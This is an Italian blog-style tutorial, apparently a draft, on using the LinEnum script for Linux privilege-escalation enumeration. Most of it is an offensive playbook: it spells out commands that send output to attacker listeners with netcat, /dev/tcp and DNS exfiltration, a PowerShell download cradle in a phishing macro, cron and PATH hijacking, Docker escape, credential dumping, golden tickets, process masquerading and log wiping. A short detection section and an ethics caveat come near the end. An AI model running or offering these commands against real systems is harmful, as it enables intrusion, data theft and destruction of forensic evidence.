---
title: 'LinEnum: Script di Enumerazione Linux per Privilege Escalation'
slug: linenum
description: 'LinEnum è uno script Bash per enumerazione automatica su sistemi Linux, utile per identificare vettori di privilege escalation in post-exploitation.'
image: /Gemini_Generated_Image_5bg0lj5bg0lj5bg0.webp
draft: true
date: 2026-02-16T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - privesc-linux
---

LinEnum è uno script bash progettato per post-exploitation enumeration su sistemi Linux compromessi. La sua forza sta nella semplicità: un singolo file bash che raccoglie informazioni critiche senza dipendenze esterne, ideale quando hai accesso limitato o sistemi con risorse ridotte.

A differenza di tool più complessi, LinEnum adotta un approccio minimalista. Non cerca di automatizzare exploitation, ma fornisce dati grezzi organizzati che un penetration tester può analizzare manualmente. Questo lo rende perfetto per chi vuole capire cosa sta succedendo sul sistema, non solo ottenere un exploit pronto.

Lo utilizzi principalmente in tre contesti: CTF dove hai shell ma non sai da dove partire, pentest su sistemi legacy con bash limitato, e scenari red team dove devi mantenere footprint minimo. A differenza di LinPEAS che evidenzia automaticamente vulnerabilità, LinEnum ti mostra i dati e tu decidi cosa è sfruttabile.

In questo articolo scoprirai come massimizzare l'efficacia di LinEnum, interpretare correttamente l'output, combinarlo con ricerche manuali per privilege escalation, e usarlo in chain con altri tool. Imparerai anche quando LinEnum è la scelta migliore rispetto ad alternative più pesanti.

LinEnum si colloca nella kill chain nella fase **Enumeration** immediatamente dopo il foothold iniziale, prima di tentare privilege escalation paths.

***

## 1️⃣ Setup e Installazione

### Download repository ufficiale

```bash
# Clone repository da GitHub
git clone https://github.com/rebootuser/LinEnum.git
cd LinEnum

# Verifica contenuto
ls -la
# LinEnum.sh  README.md  example_output.txt

# Permessi esecuzione
chmod +x LinEnum.sh
```

**Versione attuale:** Ultima release stabile sul repository rebootuser/LinEnum (aggiornato regolarmente dalla community)

**File size:** \~47KB (script bash puro, no binari)

### Alternative di download rapido

```bash
# Download diretto (senza git)
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Oppure con curl
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh

chmod +x LinEnum.sh
```

### Trasferimento su target compromesso

**Metodo 1: HTTP server + wget**

```bash
# Sul tuo attacker
python3 -m http.server 9000

# Sul target
cd /tmp
wget http://10.10.14.8:9000/LinEnum.sh
chmod +x LinEnum.sh
```

**Metodo 2: Base64 encoding per bypass**

```bash
# Sulla tua macchina
base64 LinEnum.sh > linenum.b64

# Sul target (anche senza wget/curl)
cat << 'EOF' | base64 -d > le.sh
[incolla contenuto di linenum.b64]
EOF
chmod +x le.sh
```

**Metodo 3: Paste diretto in shell (per script piccoli)**

```bash
# Apri LinEnum.sh, copia tutto il contenuto
# Sul target
cat > enum.sh << 'HEREDOC'
[incolla intero script]
HEREDOC

chmod +x enum.sh
```

### Requisiti tecnici

* **Bash:** Versione 3.x o superiore (compatibile anche con sh minimale)
* **Comandi standard Unix:** ls, ps, find, grep, awk (presenti su 99% sistemi Linux)
* **Spazio disco:** \<1MB in /tmp o /dev/shm
* **Tempo esecuzione:** 15-45 secondi (dipende da numero file/processi)
* **Permessi:** Non richiede root per maggior parte check (ma output più completo con privilegi elevati)

### Verifica funzionamento

```bash
./LinEnum.sh -h
```

**Output atteso:**

```
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################

[-] Debug Info
[*] Testing /dev/shm for execution...
[+] /dev/shm available for script execution

Options:
  -k Enter keyword (default: password,user,root)
  -e Enter export location
  -t Include thorough tests (SLOW)
  -r Report name (default: results.txt)
```

Se vedi questo menu, LinEnum è pronto per l'uso.

***

## 2️⃣ Uso Base

### Esecuzione standard senza opzioni

```bash
./LinEnum.sh
```

**Output struttura (prime sezioni):**

```
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
#

[-] Debug Info
[+] Thorough tests = Disabled (FAST mode)

### SYSTEM ##############################################

[-] Kernel information:
Linux webserver 4.15.0-142-generic #146-Ubuntu SMP x86_64 GNU/Linux

[-] Kernel information (continued):
Linux version 4.15.0-142-generic (buildd@lcy01-amd64-030)

[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"

[-] Hostname:
webserver-prod
```

L'output è organizzato per categorie:

* **SYSTEM:** Kernel, distro, hostname
* **USER/GROUP:** Utenti, gruppi, chi sei
* **ENVIRONMENTAL:** PATH, shell variables
* **JOBS/TASKS:** Cron, systemd timers
* **NETWORKING:** Interfacce, connessioni, routing
* **SERVICES:** Processi running, servizi attivi
* **SOFTWARE:** Pacchetti installati, versioni
* **INTERESTING FILES:** SUID, configs, logs

### Parametri principali

**`-k` (Keyword search):**

```bash
./LinEnum.sh -k "password,admin,secret,api"
```

Cerca keyword specifiche in file di configurazione, history, logs. Utile per trovare credenziali hardcoded.

**Output keyword search:**

```
[-] Searching for keyword: password
/var/www/html/config.php:$db_password = "Sup3rP@ss123";
/home/webadmin/.bash_history:mysql -u root -p'TempPass2024'
```

**`-e` (Export location):**

```bash
./LinEnum.sh -e /tmp/enum_results
```

Salva output in directory specifica invece di stdout. Comodo quando hai shell interattiva limitata.

**`-t` (Thorough mode):**

```bash
./LinEnum.sh -t
```

Abilita check approfonditi che richiedono più tempo:

* Ricerca file modificati di recente (ultimo mese)
* Scan completo directory home per file sensibili
* Enumeration completa software con versioni
* Parsing dettagliato log files

**ATTENZIONE:** In thorough mode, execution time passa da 30s a 2-3 minuti su sistemi grandi.

**`-r` (Custom report name):**

```bash
./LinEnum.sh -r pentest_webserver.txt -e /tmp
```

Definisce nome custom per report invece del default "results.txt".

### Combinazione parametri ottimale

```bash
# Scenario pentest: massima informazione, output salvato
./LinEnum.sh -t -k "password,key,token,secret" -e /tmp -r enum_$(hostname)_$(date +%Y%m%d).txt

# Scenario CTF: veloce, solo essenziale
./LinEnum.sh -k "flag,user,root"

# Scenario stealth: output a listener remoto
./LinEnum.sh | nc 10.10.14.8 4444
```

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: CTF enumeration - Da www-data a user flag

**Contesto:** Hai compromesso un web server via LFI, ottenuto shell come `www-data`. Cerchi user flag.

```bash
# 1. Stabilizza shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# 2. Download LinEnum
cd /dev/shm
wget http://10.10.14.5:8000/LinEnum.sh
chmod +x LinEnum.sh

# 3. Esecuzione focus su home directories
./LinEnum.sh -t -k "flag,user.txt"
```

**Output critico trovato:**

```
[-] Home directory contents:
/home/developer:
total 32
drwxr-xr-x 4 developer developer 4096 Jan 15 2024 .
-rw-r--r-- 1 developer developer   33 Jan 15 2024 user.txt
-rw-r--r-- 1 developer developer  127 Jan 15 2024 .bash_history
drwxrwxrwx 2 developer developer 4096 Jan 15 2024 scripts

[-] World-writable directories:
/home/developer/scripts

[-] Files in world-writable directory:
-rwxrwxrwx 1 developer developer backup.sh
```

**Analysis:**

* `user.txt` esiste ma non readable (no permission)
* `/home/developer/scripts` è world-writable
* `backup.sh` è world-writable ed eseguibile da tutti

**Exploitation path:**

```bash
# Verifica se backup.sh è in cron
cat /etc/crontab
# */5 * * * * developer /home/developer/scripts/backup.sh

# Inietta comando per leggere flag
echo 'cat /home/developer/user.txt > /tmp/flag.txt' >> /home/developer/scripts/backup.sh

# Attendi max 5 minuti (cron ogni 5 min)
watch -n 10 'cat /tmp/flag.txt'
```

**Timeline:**

* Download LinEnum: 3s
* Execution thorough: 90s
* Analysis output: 2min
* Exploitation setup: 30s
* Attesa cron: 0-5min
* **Totale: \~8 minuti (worst case)**

**Cosa fare se fallisce:**

1. **backup.sh non viene eseguito:** Verifica owner del cron job con `cat /var/spool/cron/crontabs/developer` (richiede root)
2. **Permission denied su /tmp:** Usa `/dev/shm/flag.txt` invece
3. **Flag non appare:** Il cron potrebbe non avere PATH corretto, usa path assoluti: `/bin/cat /home/developer/user.txt`

***

### Scenario 2: Enumeration di credenziali in enterprise environment

**Contesto:** Shell su application server (user `appuser`), devi trovare credenziali DB o SSH per lateral movement.

```bash
# Esecuzione con keyword multiple
./LinEnum.sh -k "password,passwd,pwd,DATABASE,DB_PASS,api_key,secret,token,private" -e /tmp -r creds_enum.txt
```

**Output rilevante:**

```
[-] Searching for keyword: password
/opt/application/config/database.yml:password: "MyDB_P@ssw0rd2024"
/var/log/apache2/error.log:MySQL connection failed for user 'backup' with password 'BackupUser123'

[-] Searching for keyword: private
/home/appuser/.ssh/id_rsa:-----BEGIN RSA PRIVATE KEY-----

[-] Contents of /etc/passwd:
postgres:x:112:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

**Exploitation chain:**

```bash
# 1. Testa credenziali DB trovate
mysql -h localhost -u backup -p'BackupUser123'
# Accesso granted!

mysql> SELECT user,password FROM mysql.user;
# Dumpa hash password altri users

# 2. Verifica SSH key trovata
ls -la /home/appuser/.ssh/id_rsa
# -rw-r--r-- (readable!)

cat /home/appuser/.ssh/id_rsa
# Copia chiave privata

# 3. Identifica possibili target SSH
./LinEnum.sh | grep -A10 "Active connections"
# tcp 0 0 10.10.11.45:22 10.10.11.50:45234 ESTABLISHED

# 4. Tenta SSH verso 10.10.11.50
ssh -i /tmp/stolen_key appuser@10.10.11.50
# Lateral movement successful
```

**Cosa fare se fallisce:**

* **Chiave SSH protetta da passphrase:** Usa `ssh2john` e cracka con john/hashcat
* **[MySQL](https://hackita.it/articoli/mysql) nega accesso:** Verifica host allowed con `SELECT host FROM mysql.user WHERE User='backup';`
* **Nessuna connessione SSH attiva:** Enumera `/etc/hosts` o cerca config files per hostname altri server

***

### Scenario 3: SUID binary discovery e exploitation

**Contesto:** Hai shell standard user su sistema Ubuntu. Cerchi [SUID](https://hackita.it/articoli/suid) misconfiguration.

```bash
./LinEnum.sh | grep -A50 "SUID files"
```

**Output:**

```
[-] SUID files:
-rwsr-xr-x 1 root root 1099016 May 15  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root   30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root   44680 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root   40152 Dec  4  2020 /snap/core/11606/bin/mount
-rwsr-xr-x 1 root root   27608 Jan 15  2024 /usr/local/bin/sysinfo
```

**Analysis:**

* `sysinfo` è custom binary (non standard Ubuntu package)
* SUID root + in /usr/local/bin = probabile vulnerability

**Exploitation:**

```bash
# 1. Verifica comportamento binary
/usr/local/bin/sysinfo
# Output: System Information Tool
# Running: uname -a
# Running: df -h
# [...]

# 2. Test per path hijacking
strings /usr/local/bin/sysinfo | grep -E "bin|usr|system"
# system("uname -a")  ← Chiama senza path assoluto!

# 3. Path hijacking exploitation
cd /tmp
echo '/bin/bash' > uname
chmod +x uname
export PATH=/tmp:$PATH

# 4. Esegui SUID binary
/usr/local/bin/sysinfo
# root shell spawned!
```

**Timeline:**

* LinEnum execution: 30s
* SUID analysis: 1min
* strings check: 20s
* Exploitation: 30s
* **Totale: \~3 minuti**

***

## 4️⃣ Tecniche Avanzate

### Differential enumeration per privilege escalation tracking

In engagement lunghi, esegui LinEnum prima e dopo ogni azione per identificare cosa è cambiato.

```bash
# Baseline iniziale
./LinEnum.sh -e /tmp -r baseline.txt

# Dopo aver ottenuto sudo parziale
./LinEnum.sh -e /tmp -r post_sudo.txt

# Diff analysis
diff baseline.txt post_sudo.txt | grep "^>" | head -20
```

**Output diff interessanti:**

```
> User charlie may run the following commands on this host:
>     (ALL) NOPASSWD: /usr/bin/systemctl restart webapp

> New file: /var/log/auth.log contains: sudo session opened for user root
```

Questo mostra esattamente cosa è cambiato, aiutando a identificare nuovi vettori post-exploitation.

### Chain con automated exploitation tools

LinEnum fornisce dati, ma non exploita. Combina con tools automatici per streamlined workflow.

```bash
# 1. LinEnum enumeration
./LinEnum.sh -e /tmp -r scan.txt

# 2. Estrai SUID binaries in formato processabile
grep "rwsr" /tmp/scan.txt | awk '{print $NF}' > suid_list.txt

# 3. Check automatico con GTFOBins
for binary in $(cat suid_list.txt | xargs -n1 basename); do
  echo "[*] Checking $binary"
  curl -s "https://gtfobins.github.io/gtfobins/$binary/" | grep -q "SUID" && echo "[+] $binary is exploitable!" || echo "[-] $binary not in GTFOBins"
done
```

**Output:**

```
[*] Checking pkexec
[+] pkexec is exploitable!
[*] Checking systemctl
[+] systemctl is exploitable!
```

### Stealth enumeration: minimizzare detection footprint

LinEnum genera meno eventi di [LinPEAS](https://hackita.it/articoli/linpeas), ma è comunque tracciabile.

**Detection vectors:**

```bash
# Processi visibili in ps
ps aux | grep LinEnum
# www-data  12456  0.1  0.2  12345  4567 ?  S  14:23  bash ./LinEnum.sh

# File access in auditd (se configurato)
# type=SYSCALL syscall=open name=/etc/shadow success=no
```

**Evasion tactics:**

```bash
# 1. Rename con nome innocuo
cp LinEnum.sh /tmp/.syscheck
chmod +x /tmp/.syscheck
/tmp/.syscheck

# 2. Output redirect per evitare stdout monitoring
./LinEnum.sh > /dev/tcp/10.10.14.5/9999 2>&1

# 3. Esecuzione rate-limited
# Modifica script inserendo sleep tra sezioni (editing manuale)
```

### Advanced keyword hunting con regex

LinEnum supporta keyword semplici. Per pattern matching avanzato, post-process l'output.

```bash
# Esegui LinEnum con output salvato
./LinEnum.sh -e /tmp -r full_enum.txt

# Cerca pattern specifici
grep -Ei "password\s*=|pwd\s*=|secret\s*:|token\s*:" /tmp/full_enum.txt

# Cerca chiavi API (formato AWS, GitHub, etc)
grep -Eo 'AKIA[0-9A-Z]{16}' /tmp/full_enum.txt  # AWS Access Key
grep -Eo 'ghp_[a-zA-Z0-9]{36}' /tmp/full_enum.txt  # GitHub PAT
```

**Output esempio:**

```
/var/www/api/config.json:aws_access_key = "AKIAIOSFODNN7EXAMPLE"
/home/dev/.config/gh/hosts.yml:oauth_token: ghp_16C7e42F292c6912E7710c838347Ae178B4a
```

Queste sono credenziali cloud che LinEnum keyword search standard potrebbe non trovare.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: Red Team - Maintaining stealth su production server

**Contesto:** Hai compromesso un production database server monitorato da SIEM. Devi enumerare senza triggerare allarmi.

```bash
# COMANDO - Execution in-memory + output remoto
curl -s http://10.10.14.5:8000/LinEnum.sh | bash 2>&1 | nc 10.10.14.5 4444

# Sulla tua macchina (listener)
nc -lvnp 4444 > linenum_dbserver.txt
```

**OUTPUT ATTESO** (sul tuo listener):

```
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################

[-] Kernel information:
Linux dbserver 5.4.0-88-generic #99-Ubuntu SMP x86_64

[-] MySQL process running as:
mysql    1234  0.5  2.1 1123456 123456 ? Ssl  10:23   0:45 /usr/sbin/mysqld

[-] Network connections:
tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN (mysqld)
tcp 0 0 10.10.11.30:3306 10.10.11.45:54321 ESTABLISHED
```

**EXPLOITATION DECISION:**

Output mostra MySQL listening su tutte le interfacce (0.0.0.0). Probabile che possiamo accedere da remoto se troviamo credenziali.

```bash
# Sul target, cerca config MySQL
find /etc /var -name "*.cnf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
# /etc/mysql/debian.cnf:password = DebianSysPass123

# Testa accesso remoto (dalla tua macchina)
mysql -h 10.10.11.30 -u debian-sys-maint -p'DebianSysPass123'
# Accesso granted = lateral movement senza detection sul target
```

**COSA FARE SE FALLISCE:**

1. **Output non arriva al listener:** Firewall outbound blocca connessioni, usa DNS exfiltration.

```bash
./LinEnum.sh | xxd -p | while read line; do dig $line.yourdomain.com; done
```

1. **MySQL remoto bloccato:** Verifica bind-address in `my.cnf`, se è 127.0.0.1 usa SSH tunneling invece di connessione diretta
2. **SIEM allerta su curl verso IP esterno:** Usa server interno già compromesso come staging point

**Timeline:** 2 minuti (30s download + 30s execution + 1min analysis)

***

### Scenario B: Kernel exploit identification in patching audit

**Contesto:** Security audit su fleet di 100 server Linux. Devi identificare quali sono vulnerabili a CVE noti.

```bash
# COMANDO - Batch execution con output structured
for server in $(cat servers.txt); do
  echo "[*] Scanning $server"
  ssh admin@$server 'curl -s http://internal-tools/LinEnum.sh | bash | grep -E "Kernel|VERSION"' > "enum_$server.txt" &
done
wait

# Analisi batch
grep "Linux version 4\." enum_*.txt | cut -d: -f1 | sort -u
# Servers con kernel 4.x (potenzialmente vulnerabili)
```

**OUTPUT ATTESO:**

```
enum_web01.txt
enum_web03.txt
enum_db02.txt
enum_app05.txt
```

**EXPLOITATION PLANNING:**

```bash
# Correlazione CVE per kernel 4.x
cat enum_web01.txt | grep "Linux version"
# Linux version 4.15.0-142-generic

# Searchsploit check
searchsploit kernel 4.15.0 ubuntu privilege
# [+] CVE-2021-3493 (OverlayFS) - Ubuntu Kernel 4.15.0
```

Identifica i server prioritari per patching basandoti su CVE pubblici.

**COSA FARE SE FALLISCE:**

* **SSH batch fallisce su alcuni server:** Verifica key-based auth, potrebbe servire password per alcuni host
* **LinEnum timeout su server lenti:** Aggiungi timeout wrapper: `timeout 60s bash | bash`
* **Output troppo verboso per analisi:** Usa `grep -A5 "Kernel information:"` per estrarre solo sezioni critiche

**Timeline:** \~5 minuti per 100 server in parallelo (vs 1+ ora sequenziale)

***

### Scenario C: Docker container escape enumeration

**Contesto:** Hai compromesso applicazione in container Docker. Vuoi capire se puoi escapare verso host.

```bash
# COMANDO - Focus su container-specific checks
./LinEnum.sh -t | grep -A10 -B5 -E "docker|container|cgroup|\.dockerenv"
```

**OUTPUT ATTESO:**

```
[-] Specific release information:
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"

[-] Additional release information:
/.dockerenv  ← File presente = siamo in container

[-] Mounted filesystems:
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/...)
/dev/sda1 on /host type ext4 (rw,relatime)  ← Host filesystem montato!

[-] Docker socket found:
srw-rw---- 1 root docker /var/run/docker.sock

[-] Processes running as root:
root         1  0.0  0.1  /usr/bin/dockerd
```

**ANALYSIS:**

* `/host` directory montato = potenziale accesso diretto a host filesystem
* `docker.sock` presente = possibile container escape via Docker API

**EXPLOITATION:**

```bash
# Verifica accesso a /host
ls -la /host
# drwxr-xr-x 23 root root 4096 /host

# Tenta pivot su host
chroot /host /bin/bash
# root@dockerhost:/#  ← Escaped to host!

# Alternativa: Docker socket API
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# [{"Id":"abc123...", "Image":"webapp:latest", ...}]

# Crea container privilegiato per escape
docker -H unix:///var/run/docker.sock run -v /:/hostfs --privileged -it alpine chroot /hostfs
```

**COSA FARE SE FALLISCE:**

* **Permission denied su /host:** Check capabilities con `capsh --print`, serve `CAP_SYS_ADMIN` per chroot
* **Docker socket non accessibile:** Verifica group membership, aggiungi user a group docker se possibile
* **No docker client in container:** Usa curl per interagire con API, oppure scarica docker static binary

**Timeline:** 3 minuti (1min enum + 2min escape attempts)

***

## 6️⃣ Toolchain Integration

### Pre-LinEnum: Initial Access tools

Prima di LinEnum, devi ottenere shell. Sequence tipica:

**Web vulnerability → Shell → LinEnum**

```bash
# Esempio: SQL injection to shell
sqlmap -u "http://target.com/page?id=1" --os-shell
# SQL Shell spawned

# Upgrade a bash
SHELL> bash -i

# Download LinEnum
bash$ curl http://attacker.com/LinEnum.sh | bash
```

**Metasploit → Meterpreter → LinEnum**

```bash
meterpreter > shell
Process 2345 created.
Channel 1 created.
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ wget http://10.10.14.5/LinEnum.sh
bash-4.2$ chmod +x LinEnum.sh
bash-4.2$ ./LinEnum.sh
```

***

### Post-LinEnum: Exploitation tools

LinEnum identifica vettori, poi serve tool specifico per sfruttarli.

**LinEnum trova kernel CVE → Exploit compilation**

```bash
# LinEnum output
[-] Kernel information:
Linux version 4.4.0-131-generic

# Identification
searchsploit linux kernel 4.4.0
# Linux Kernel 4.4.0 < 4.4.0-145 (Ubuntu) - Local Privilege Escalation (CVE-2017-16995)

# Download & compile
wget https://www.exploit-db.com/download/45010 -O exploit.c
gcc exploit.c -o privesc
./privesc
# [+] Root shell obtained
```

***

### LinEnum + LinPEAS: Complementary approach

In pentest enterprise complessi, usa entrambi per coverage massima.

**Workflow:**

```bash
# 1. LinEnum first (veloce, baseline)
./LinEnum.sh -e /tmp -r linenum_baseline.txt

# 2. Identifica aree interessanti da LinEnum
cat linenum_baseline.txt | grep -E "writable|SUID|sudo"

# 3. LinPEAS per deep analysis su specifiche aree
# (vedi articolo su come utilizzare LinPEAS per deep analysis)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**Vantaggi approccio dual-tool:**

* LinEnum = quick overview (30s)
* LinPEAS = automated vulnerability scoring (2min)
* Se LinEnum trova qualcosa di sospetto, LinPEAS fornisce contesto CVE
* Se LinPEAS da false positive, LinEnum aiuta validazione manuale

***

### Tabella decisionale: LinEnum vs Altri Tools

| **Criterio**            | **LinEnum**            | **LinPEAS**             | **pspy**            | **Manual Enum**     |
| ----------------------- | ---------------------- | ----------------------- | ------------------- | ------------------- |
| **Velocità execution**  | ⚡ 30s                  | ⚠️ 60s                  | 🔄 Continuous       | 🐌 10+ min          |
| **False positive rate** | 🟢 Basso (dati grezzi) | 🟡 Medio (auto-scoring) | 🟢 Nessuno          | 🟢 Dipende da skill |
| **Skill required**      | 🟡 Intermedio          | 🟢 Junior               | 🔵 Avanzato         | 🔴 Expert           |
| **Output readability**  | 📄 Plain text chiaro   | 🎨 Colorato + link      | 📊 Real-time stream | ✍️ Note manuali     |
| **Resource usage**      | 💚 Leggero (5% CPU)    | 🟡 Medio (15% CPU)      | 💚 Leggero          | 💚 Minimal          |
| **Stealth level**       | 🟢 Medio               | 🔴 Basso                | 🟢 Alto (passive)   | 🟢 Massimo          |
| **Best use case**       | Quick CTF enum         | Full pentest audit      | Cron/process spy    | Red Team stealth    |

**Quando usare LinEnum:**
✅ Hai 1-2 minuti max per enumeration
✅ Sistema con risorse limitate (old hardware, container)
✅ Vuoi output human-readable da analizzare offline
✅ Preferisci controllo manuale su cosa exploitare
✅ Target senza bash 4.x (LinPEAS richiede bash moderno)

**Quando NON usare LinEnum:**
❌ Vuoi automated CVE matching (usa LinPEAS)
❌ Devi monitorare processi in tempo reale (usa pspy)
❌ Red Team con requirement stealth assoluto (usa manual enum)
❌ Sistema con AppArmor strict che blocca script bash

***

## 7️⃣ Attack Chain Completa

### From [Phishing](https://hackita.it/articoli/phishing) to Domain Admin via LinEnum

**FASE 1: Social Engineering (Initial Access)**

Phishing email con malicious document → Macro execution → Reverse shell

```bash
# Payload in macro VBA
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# Shell ricevuta su attacker (Windows user)
nc -lvnp 443
```

**Timeline:** Dipende da target click rate (ore/giorni) + execution immediato

***

**FASE 2: Lateral Movement verso Linux Jump Server**

```bash
# Da Windows shell, enumera network
ipconfig /all
arp -a
# Identifica: 10.10.20.15 (jump-server Linux)

# Tenta credenziali default
ssh admin@10.10.20.15
# Password: admin → Accesso granted (weak password)
```

**Timeline:** 5 minuti (network enum + password guessing)

***

**FASE 3: Local Enumeration con LinEnum**

```bash
# Su jump server Linux
cd /tmp
wget http://10.10.14.8:9000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -k "password,admin,root,ssh" -e /tmp -r jump_enum.txt
```

**Output critico:**

```
[-] Searching for keyword: password
/home/admin/.bash_history:ssh root@dc01.corp.local -p 'WinterAdmin2024!'

[-] SUID files:
-rwsr-xr-x 1 root root /usr/bin/pkexec  ← CVE-2021-4034 vulnerable

[-] sudo -l output:
User admin may run the following commands:
    (ALL) NOPASSWD: /usr/bin/nmap
```

**Timeline:** 2 minuti

***

**FASE 4: Privilege Escalation su Jump Server**

```bash
# Opzione 1: sudo nmap (più veloce)
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
# root@jump-server

# Opzione 2: pkexec CVE-2021-4034 (se nmap blocka per policy)
wget https://github.com/arthepsy/CVE-2021-4034/raw/main/cve-2021-4034.sh
chmod +x cve-2021-4034.sh
./cve-2021-4034.sh
# root shell
```

**Timeline:** 1-2 minuti

***

**FASE 5: Credential Harvesting e Pivot**

```bash
# Dumpa password trovate in bash history
cat /home/admin/.bash_history | grep ssh
# ssh root@dc01.corp.local -p 'WinterAdmin2024!'

# Verifica credenziali Domain Controller
ssh root@dc01.corp.local
# Denied (SSH disabled su DC, solo WinRM)

# Usa credenziali su SMB invece
crackmapexec smb dc01.corp.local -u administrator -p 'WinterAdmin2024!'
# SMB  10.10.20.10  445  DC01  [+] corp.local\administrator:WinterAdmin2024! (Pwn3d!)
```

**Timeline:** 3 minuti

***

**FASE 6: Domain Admin Access**

```bash
# Dumpa NTDS con credenziali DA
secretsdump.py 'corp.local/administrator:WinterAdmin2024!@dc01.corp.local'

# Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b3c2b7f0f93e5c7d9f3c8e1d2a4b5c6d:::

# Golden Ticket attack
python ticketer.py -nthash b3c2b7f0f93e5c7d9f3c8e1d2a4b5c6d -domain-sid S-1-5-21-... -domain corp.local Administrator

# Full domain compromise achieved
```

**Timeline:** 5 minuti

***

**TOTALE END-TO-END:** \~20 minuti da jump server access a Domain Admin (escludendo initial phishing delivery time)

**Tools nella chain:**

1. Malicious macro (initial access)
2. PowerShell (payload delivery)
3. SSH client (lateral movement)
4. **LinEnum** (enumeration - KEY ROLE)
5. sudo/nmap (local privilege escalation)
6. [CrackMapExec](https://hackita.it/articoli/crackmapexec) (credential validation)
7. secretsdump/[Impacket](https://hackita.it/articoli/impacket) (credential dumping)
8. [ticketer.py](https://hackita.it/articoli/ticketer) (golden ticket generation)

LinEnum è stato il punto di svolta: senza trovare la password in `.bash_history`, l'attacco avrebbe richiesto bruteforce o phishing aggiuntivo (giorni/settimane extra).

***

## 8️⃣ Detection & Evasion

### Cosa monitora il Blue Team

**File creation in suspicious directories**

```bash
# auditd rule tipica per /tmp monitoring
-w /tmp -p wa -k temp_file_creation

# Log generato da LinEnum download
type=PATH msg=audit(1675434567.890:12345): item=0 name="/tmp/LinEnum.sh" inode=98765
```

**Process execution patterns**

```bash
# SIEM correlation rule
IF process_name = "bash" OR "sh"
AND command_line CONTAINS "LinEnum" OR "enum" OR "privilege"
AND parent_process = "apache2" OR "www-data"
THEN ALERT "Suspicious enumeration script"
```

**Network connections to pastebin/GitHub**

```bash
# Firewall/Proxy log
Feb 05 14:23:45 firewall: ALLOW TCP src=10.10.20.15 dst=185.199.108.133 dport=443 (github.com)
Feb 05 14:23:46 firewall: ALLOW TCP src=10.10.20.15 dst=185.199.108.133 dport=443 (raw.githubusercontent.com)
```

**Bash history analysis**

```bash
# Post-incident forensic check
cat /home/*/.bash_history | grep -i "wget\|curl" | grep -i "enum\|priv\|exploit"
# wget http://10.10.14.5:9000/LinEnum.sh
```

***

### Tecniche di evasion realistiche

**1. In-memory execution senza file su disco**

```bash
# Download diretto in pipe bash
curl -s http://attacker.com/LinEnum.sh | bash

# O con output a listener remoto
curl -s http://attacker.com/LinEnum.sh | bash 2>&1 | nc attacker.com 4444
```

**Vantaggi:**

* Nessun file in `/tmp` da rilevare
* Nessuna bash\_history entry per chmod/execution
* Forensic difficile (niente artifact su disco)

**Svantaggi:**

* Processo `bash` comunque visibile in `ps`
* Network connection verso attacker più sospetta di local execution

***

**2. Offuscazione nome processo (process masquerading)**

```bash
# Rinomina bash process per sembrare legittimo
cp /bin/bash /tmp/systemd-check
echo "curl http://attacker.com/LinEnum.sh | /tmp/systemd-check" | /tmp/systemd-check

# In ps apparirà come:
# /tmp/systemd-check  ← Sembra processo di sistema
```

**Avanzato: argv\[0] spoofing**

```bash
# Compile wrapper che cambia argv[0]
cat << 'EOF' > wrapper.c
#include <unistd.h>
int main() {
    char *argv[] = {"[kworker/0:1]", NULL};  // Simula kernel worker
    execv("/bin/bash", argv);
    return 0;
}
EOF
gcc wrapper.c -o systemd-udevd
./systemd-udevd -c "curl http://attacker.com/LinEnum.sh | bash"
```

**Risultato:** In `ps aux` appare come `[kworker/0:1]` invece di `bash LinEnum.sh`

***

**3. Timing obfuscation (slow execution)**

Molti SIEM cercano "burst di system call in breve tempo".

```bash
# Split LinEnum execution in chunk lenti
sections=("SYSTEM" "USER" "SUID" "NETWORK" "JOBS")
for section in "${sections[@]}"; do
  ./LinEnum.sh | grep -A20 "$section" >> /tmp/.log
  sleep 120  # 2 minuti tra ogni sezione
done
```

**Rationale:** Detection threshold tipico è "100+ syscall/min". Rallentando, rimani sotto radar.

***

### Cleanup post-enumeration

**Rimozione artifact evidenti:**

```bash
# File scaricati
rm -f /tmp/LinEnum.sh /tmp/enum_*.txt /dev/shm/le.sh

# Bash history (attenzione: molto sospetto se fatto male)
history | grep -E "LinEnum|wget|curl" | cut -d' ' -f1 | while read num; do
  history -d $num
done

# O nucleare (ma red flag per SOC)
cat /dev/null > ~/.bash_history
history -c
```

**Log sanitization (richiede root):**

```bash
# Rimuovi entry specifiche da syslog
sed -i '/LinEnum/d' /var/log/syslog
sed -i '/10\.10\.14\.5/d' /var/log/syslog  # Rimuovi IP attacker

# Clear systemd journal
journalctl --vacuum-time=1s

# Pulisci auth.log
sed -i "/$(date +%b\ %d)/d" /var/log/auth.log  # Rimuove log del giorno
```

**ATTENZIONE ETICA:** Log tampering è **illegale** senza esplicita autorizzazione nel ROE di un pentest. In engagement reale:

* Documenta ogni azione
* Non modificare log senza permesso scritto
